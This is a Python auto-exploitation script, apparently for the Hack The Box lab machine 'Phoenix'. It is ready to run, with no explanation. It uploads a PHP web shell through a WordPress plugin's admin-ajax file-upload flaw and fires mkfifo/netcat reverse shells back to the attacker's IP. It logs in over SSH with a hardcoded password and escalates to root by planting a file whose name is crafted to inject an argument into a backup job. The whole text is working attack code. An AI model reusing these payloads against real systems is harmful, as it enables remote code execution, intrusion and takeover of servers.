try:
    from pwn import *
    os.system("echo '10.10.11.149 phoenix.htb' >> /etc/hosts")
    print("\n[\033[1;32m+\033[1;37m] Autopwn Name ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

from os import path
import os.path, json, requests, urllib3

urllib3.disable_warnings()

cmdphp = "<?php\n    echo shell_exec($_REQUEST['cmd']);\n?>"

os.system("echo '%s' > cmd.phtml" % (cmdphp))
os.system("echo '10.10.11.149 phoenix.htb' >> /etc/hosts")

if len(sys.argv) < 2:
    print(f"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <ip>\n")
    exit(1)

ip = sys.argv[1]

def cmd():
    time.sleep(2)
    expl = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>%261|nc {ip} 9001 >/tmp/f"
    url = "https://phoenix.htb/wp-admin/"
    uploadp = "admin-ajax.php?action=download_from_files_617_fileupload"
    phpm = "./cmd.phtml"
    files = {'files[]' : open(phpm)}
    data = {"allowExt" : "php4,phtml", "filesName" : "files", "maxSize" : "1000", "uploadDir" : "."}
    requests.post(url + uploadp, files=files, data=data, verify=False)
    requests.get(url + "cmd.phtml?cmd=" + expl, verify=False)

def sher():
    threading.Thread(target=cmd, args=()).start()
    revs = f"bash -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} 4444 >/tmp/f'"
    shellroot = f'cd /backups; touch -- "-e sh shell.sh"; chmod +x -- "-e sh shell.sh"; echo "%s" > shell.sh; chmod +x shell.sh' % (revs)
    shell = listen(9001, timeout=90).wait_for_connection()
    shell.sendline(b"script /dev/null -c bash")
    shell.sendline(b"ssh editor@10.11.12.13")
    time.sleep(5)
    shell.sendline(b"yes")
    time.sleep(5)
    shell.sendline(b"superphoenix")
    time.sleep(5)
    shell.sendline("%s" % (shellroot))

threading.Thread(target=sher, args=()).start()
print("[\033[1;34m*\033[1;37m] Esto puede tardar de 3 a 7 minutos\n")
root = listen(4444, timeout=410).wait_for_connection()
root.interactive()
